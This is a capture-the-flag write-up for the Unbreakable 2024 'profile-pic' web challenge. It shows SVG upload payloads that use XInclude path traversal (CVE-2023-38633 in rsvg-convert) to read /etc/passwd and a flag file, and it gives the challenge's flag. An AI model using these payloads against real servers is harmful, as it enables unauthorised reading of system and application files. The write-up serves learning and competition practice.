---
title: profile-pic
type: writeup
date: 2024-04-07T12:50:30+03:00
description: Writeup for profile-pic [Unbreakable 2024]
author: H0N3YP0T
tags:
- web
draft: false
---
___

## Challenge Description

Can you change my profile picture in a hacker way?

Flag format: ctf{sha256sum}


## Intuition

The website is very simple with an upload feature. It means the attack vector is certainly a file upload vulnerability.
The server is PHP because I can add `index.php` at the end of the home page. We first thought about injecting php code, but
we finally looked at XXE upload chaining with the upload feature.

![img.png](/images/unbreakable_2024/profile.png)

Another hint about svg exploit was that the file was renamed and retyped to `png` after upload therefore it was obvious
that we had to exploit something else than php.

![img.png](/images/unbreakable_2024/png.png)

## Solution

The first step is to bypass the length check of the image. We can do this by changing the content-type of the image to `text/xml` and then upload a simple XML file.
![img.png](/images/unbreakable_2024/size.png)

![img.png](/images/unbreakable_2024/error.png)

The correct size is actually 50x50px. We can bypass this as follows:

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="50" height="50" xmlns:xi="http://www.w3.org/2001/XInclude">
</svg>
```
The next step was to try to read source code or run commands using `expect://` or `file://` but it didn't work.
We noticed the error message above about the size and library `rsvg-convert` so we looked for recent exploits and 
found [this one](https://secalerts.co/vulnerability/CVE-2023-38633) therefore we tried to exploit it.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="50" height="50" xmlns:xi="http://www.w3.org/2001/XInclude">
    <rect width="50" height="50" style="fill:rgb(255,255,255);" />
    <text x="10" y="10">
        <xi:include href=".?../../../../../../../etc/passwd" parse="text" encoding="UTF-8">
            <xi:fallback>file not found</xi:fallback>
        </xi:include>
    </text>
</svg>
```

![img.png](/images/unbreakable_2024/passwd.png)

We got it something ! Now it is time to read the flag file. And after enumerating some default paths for Apache server,
we found the flag in `/var/www/html/flag.php`.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="50" height="50" xmlns:xi="http://www.w3.org/2001/XInclude">
  <rect width="50" height="50" style="fill:rgb(255,255,255);" />
  <text x="-610" y="25">
    <xi:include href=".?../../../../../../../var/www/html/flag.php" parse="text" encoding="UTF-8">
      <xi:fallback>file not found</xi:fallback>
    </xi:include>
  </text>
</svg>
```
![img.png](/images/unbreakable_2024/flag.png)

The last step is to play with the following param `<text x="-610"` in order to read the flag.

### Flag

`CTF{af0a742b17dd73ca3d8ff27c885350a890c4ab104670fa3373de63c7709925b0}`

## Acknowledge

This writeup was co-authored by [sunbather](https://github.com/costinteo), [Koyossu](https://github.com/SecioreanuStefanita) and [H0N3YP0T](https://github.com/Mathis-Dory).

